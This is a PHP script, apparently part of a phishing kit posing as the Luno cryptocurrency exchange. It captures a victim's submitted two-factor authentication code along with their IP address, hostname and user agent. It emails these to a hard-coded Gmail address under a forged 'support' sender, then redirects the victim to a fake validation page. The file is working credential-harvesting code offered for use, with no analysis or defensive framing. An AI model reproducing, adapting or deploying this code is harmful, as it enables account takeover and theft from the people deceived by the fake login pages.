<?php
if($_POST["2factor"] != "" and $_POST["2factor"] != ""){
date_default_timezone_set("Africa/Johannesburg");
$ip = $_SERVER['REMOTE_ADDR'];
	$time = time();
	$date = date("Y-m-d H:i:s");
	$ccn = $_POST['2factor'];
$ip = getenv("REMOTE_ADDR");
$hostname .= gethostbyaddr($ip);
$useragent .= $_SERVER['HTTP_USER_AGENT'];
$message .= '<html>
<head></head>
                    <body>
                        <table style="">
                            <tr>
                                <td style="font-weight: bold">2nd Two-Factor Auth:</td>
                                <td style="padding-left: 1em;">'.$_POST['2factor'].'</td>
                            </tr>
                           
                            <tr>
                                <td style="font-weight: bold">IP Address:</td>
                                <td style="padding-left: 1em;">'.$ip.'</td>
                            </tr>
							<tr>
							<td style="font-weight: bold">User Agent:</td>
							<td style="padding-left: 1em;">'.$useragent.'</td></tr>
                        </table>
                    </body>
                </html>';
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";


   $from = "Luno 4th <support@".$_SERVER['HTTP_HOST'].">";
	$headers = "From:" . $from. "\r\n";
        $headers .= "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject = "2nd Two-Factor Auth Result [$ccn] [$ip] [$date]";
        if(mail("solomongrand2003@gmail.com",$subject,$message,$headers))
	
			$praga=rand();
$praga=md5($praga);
  header ("Location: validating.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>
